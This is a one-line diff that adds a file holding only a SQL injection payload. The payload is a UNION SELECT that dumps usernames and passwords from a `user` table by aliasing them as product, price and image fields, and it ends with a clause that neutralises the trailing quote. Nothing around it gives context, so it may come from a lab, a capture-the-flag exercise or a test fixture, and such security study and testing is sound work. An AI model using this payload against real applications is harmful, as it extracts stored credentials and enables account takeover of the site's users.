@@ -1,0 +1,1 @@
+' UNION SELECT `username` AS `product`, `password` AS `price`, `password`AS `image` FROM `user` WHERE '1' LIKE '1%
